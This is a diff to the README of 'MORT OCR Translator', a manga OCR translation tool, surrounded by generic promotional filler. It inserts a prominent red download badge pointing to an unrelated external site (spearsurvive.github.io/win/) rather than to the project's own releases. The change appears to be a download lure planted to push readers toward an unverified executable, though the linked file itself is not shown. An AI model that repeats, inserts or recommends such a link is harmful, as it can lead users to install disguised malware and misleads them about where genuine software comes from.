@@ -30,6 +30,12 @@ MORT is an OCR-based translation tool designed for manga and comic images, detec
 
 Whether you're a newcomer or a veteran, MORT OCR Translator provides the tools you need to get the most out of your ai tools experience. Designed for Windows and macOS, it delivers a seamless, high-performance workflow.
 
+<div align="center">
+
+[![Download MORT OCR Translator](https://img.shields.io/badge/⬇_DOWNLOAD_MORT+OCR+Translator-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+
+</div>
+
 ---
 
 ## ✨ Key Features
